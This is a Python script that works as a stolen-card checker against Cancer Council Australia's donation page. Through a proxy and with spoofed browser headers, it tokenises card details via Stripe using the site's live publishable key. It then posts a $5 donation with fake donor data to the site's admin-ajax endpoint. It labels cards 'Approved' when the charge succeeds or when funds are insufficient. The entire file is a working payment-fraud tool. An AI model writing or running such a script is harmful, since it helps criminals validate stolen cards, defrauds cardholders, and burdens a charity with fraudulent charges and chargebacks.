import requests
from httpx import AsyncClient
from urllib.parse import parse_qs

async def stripeccn1(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxies=proxyg,follow_redirects=True) as web:
        ip = await web.get('https://api.ipify.org/?format=json')
        print(ip.text)
        headers = {
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }
        
        query_string = 'guid=N/A&muid=N/A&sid=N/A&referrer=https%3A%2F%2Fwww.cancercouncil.com.au&time_on_page=52297&card[name]=asd+as&card[address_line1]=&card[address_city]=&card[address_state]=&card[address_zip]=&card[address_country]=Australia&card[number]=4275140041492111&card[cvc]=&card[exp_month]=08&card[exp_year]=27&payment_user_agent=stripe.js%2Fd7f2cc0ba1%3B+stripe-js-v3%2Fd7f2cc0ba1%3B+split-card-element&pasted_fields=number&key=pk_live_VcG7g0XzgFwOsTI0e8q6QXCH00KSWByLY1'
        
        data = {k: v[0] for k, v in parse_qs(query_string).items()}
        req1 = await web.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
        stripe_token = req1.json()['id']
        stripe2 = req1.json()['card']['id']

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': '_gcl_au=1.1.1475927069.1734162742; _ga=GA1.1.324575352.1734162743; _mkto_trk=id:538-CPQ-855&token:_mch-cancercouncil.com.au-372c8f086d26d14ad9fc11587289f5d7; _fbp=fb.2.1734162743005.434486278284680105; _clck=12tykgc%7C2%7Cfrp%7C0%7C1809; _conv_r=s%3Awww.nerdydata.com*m%3Areferral*t%3A*c%3A; _hjSession_213222=eyJpZCI6IjliZjFmMWI0LTRmYmItNGZlNC1hYmM3LWRjMDdiMGE2NDZhOCIsImMiOjE3MzQxNjI3NDMxMTEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _conv_v=vi%3A1*sc%3A1*cs%3A1734162743*fs%3A1734162743*pv%3A2*exp%3A%7B%7D; _conv_s=si%3A1*sh%3A1734162743092-0.13527659876973153*pv%3A2; _clsk=1u9k0wy%7C1734162745317%7C2%7C1%7Cu.clarity.ms%2Fcollect; _hjSessionUser_213222=eyJpZCI6Ijk1ZTUwMzViLTJiZjUtNWM0MC05ZDY0LTRkNzM4NmQzZjJmOSIsImNyZWF0ZWQiOjE3MzQxNjI3NDMxMTEsImV4aXN0aW5nIjp0cnVlfQ==; __stripe_mid=65daa68a-b31b-41cd-95f6-31d5417371f87f5202; __stripe_sid=3e9f6b68-e395-4ac1-9f95-a091a10255327acec0; _ga_V46V2SNBR4=GS1.1.1734162742.1.1.1734162797.5.0.0',
            'origin': 'https://www.cancercouncil.com.au',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.cancercouncil.com.au/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'action': 'process_payment_method',
            'token': stripe_token,
            'cardId': stripe2,
            'formData': '{"totalAmount":5,"frequency":"Oneoff","email":"scarlatmario4@tiktok.tf","currency":"AUD","firstName":"dxczxc","lastName":"zxcxz","address":{"addressLine1":"","addressLine2":"","city":"","state":"","postalCode":"","country":"Australia"},"mobile":"5059947000","organisationName":"","inMemoryOf":"","utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_content":null,"utm_term":null,"iteration_id":"IT0001529"}',
            'currentUrl': 'https://www.cancercouncil.com.au/donate/',
        }

        req2 = await web.post('https://www.cancercouncil.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
        await web.aclose()
        print(req2.text)
        if req2.json()['success'] == True:
            status = "Approved ✅"
            mensaje = "Charged $5.00"
        else:
            mensaje = req2.json()['data']
            if "Your card has insufficient funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje